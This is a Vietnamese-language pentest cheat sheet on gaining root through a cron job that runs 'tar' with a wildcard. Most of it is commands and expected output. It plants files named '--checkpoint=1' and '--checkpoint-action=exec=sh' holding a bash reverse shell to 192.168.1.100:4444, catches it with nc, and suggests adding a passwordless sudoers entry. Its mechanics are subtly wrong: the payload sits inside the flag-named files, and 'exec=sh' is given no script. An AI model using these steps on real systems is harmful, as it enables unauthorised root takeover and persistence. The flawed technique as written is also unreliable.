# Wildcards & File Manipulation Exploits

## Điểm chính khai thác

* Khai thác cron job sử dụng lệnh TAR với wildcard (ví dụ: `tar -cf backup.tar *`) trong thư mục có thể ghi để kích hoạt cơ chế checkpoint, thực thi lệnh độc hại với đặc quyền cron job (thường là root)
* Tạo tệp `--checkpoint=1` và `--checkpoint-action=exec=sh` trong thư mục có thể ghi để lừa TAR thực thi lệnh như shell script khi xử lý wildcard
* Yêu cầu thư mục có thể ghi (tìm bằng `find / -writable -type d`) và cron job TAR sử dụng wildcard, kiểm tra bằng **pspy** hoặc `/etc/crontab`
* Lệnh độc hại có thể tạo shell ngược, sửa `/etc/passwd`, thêm khóa SSH, hoặc tạo tệp nhị phân SUID, tùy thuộc vào mục tiêu khai thác
* Phát hiện cron job TAR bằng **pspy**, `grep -r "tar.*\*" /etc/cron*`, hoặc nhật ký cron (`grep "CRON" /var/log/syslog`)

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Tìm thư mục có thể ghi để đặt tệp độc hại:

```
find / -writable -type d 2>/dev/null
```

Output mong đợi: Danh sách thư mục, ví dụ: `/tmp`

Kiểm tra cron job sử dụng TAR với wildcard:

```
pspy
```

Output mong đợi: Tiến trình root, ví dụ: `UID=0 PID=1234 | tar -cf /backup/backup.tar *`

Kiểm tra nhật ký cron để xác nhận:

```
grep "CRON" /var/log/syslog
```

Output mong đợi: Lệnh cron, ví dụ: `cron[1234]: (root) CMD (tar -cf /backup/backup.tar *)`

Kiểm tra tập lệnh cron chứa TAR với wildcard:

```
grep -r "tar.*\*" /etc/cron*
```

Output mong đợi: Tập lệnh, ví dụ: `/etc/cron.daily/backup: tar -cf /backup/backup.tar *`

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền ghi trên thư mục mục tiêu (ví dụ: /tmp):

```
ls -ld /tmp
```

Output mong đợi: Quyền thư mục, ví dụ: `drwxrwxrwt 10 root root 4096`

#### Phân tích ngữ cảnh thực thi

Xác minh hành vi TAR trong cron job:

```
pspy
```

Output mong đợi: Lệnh TAR với wildcard, ví dụ: `UID=0 PID=1234 | tar -cf /backup/backup.tar *`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo tệp kích hoạt cơ chế checkpoint:

```
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/--checkpoint=1
```

Ghi chú: Thay `192.168.1.100` và `4444` bằng IP và cổng attacker. Tệp này kích hoạt chế độ checkpoint.

Tạo tệp thực thi lệnh độc hại:

```
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/--checkpoint-action=exec=sh
```

Ghi chú: Lệnh trong tệp được thực thi bởi TAR với đặc quyền cron job.

#### Áp dụng khai thác

Chờ cron job chạy để kích hoạt lệnh độc hại:

```
sleep 300
```

Ghi chú: Điều chỉnh thời gian dựa trên lịch cron (kiểm tra `/etc/crontab` hoặc **pspy**).

Bắt shell ngược:

```
nc -lvnp 4444
```

Output mong đợi: Kết nối từ mục tiêu, ví dụ: `Connection from 192.168.1.101:45678`

#### Kích hoạt khai thác

Kiểm tra quyền root sau khi nhận shell:

```
id
```

Output mong đợi: Quyền root, ví dụ: `uid=0(root) gid=0(root)`

### Kiểm tra kết quả

Xác nhận quyền root:

```
whoami
```

Output mong đợi: `root`\
Xác nhận: Thử lệnh yêu cầu quyền cao, ví dụ: `echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`.

## Ví dụ khai thác

### Khai thác TAR Checkpoint cho Shell Ngược

**Kịch bản mẫu**: Cron job root chạy `tar -cf /backup/backup.tar *` trong `/tmp` mỗi 5 phút, `/tmp` có thể ghi. Tạo tệp checkpoint để mở shell ngược.\
**Output**:

```
pspy
2025/05/16 14:00:01 CMD: UID=0 PID=1234 | tar -cf /backup/backup.tar *

grep "CRON" /var/log/syslog
cron[1234]: (root) CMD (tar -cf /backup/backup.tar *)

ls -ld /tmp
drwxrwxrwt 10 root root 4096

echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/--checkpoint=1
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/--checkpoint-action=exec=sh

sleep 300
nc -lvnp 4444
Connection from 192.168.1.101:45678
whoami
root
```

### Khai thác TAR Checkpoint để Kiểm tra Đặc quyền

**Kịch bản mẫu**: Cron job root chạy `tar -cf /backup/backup.tar *` trong `/tmp`. Tạo tệp checkpoint để kiểm tra đặc quyền bằng lệnh `whoami`.\
**Output**:

```
pspy
2025/05/16 14:00:01 CMD: UID=0 PID=1234 | tar -cf /backup/backup.tar *

grep "CRON" /var/log/syslog
cron[1234]: (root) CMD (tar -cf /backup/backup.tar *)

ls -ld /tmp
drwxrwxrwt 10 root root 4096

echo "whoami > /tmp/rooted" > /tmp/--checkpoint=1
echo "whoami > /tmp/rooted" > /tmp/--checkpoint-action=exec=sh

sleep 300
cat /tmp/rooted
root
```
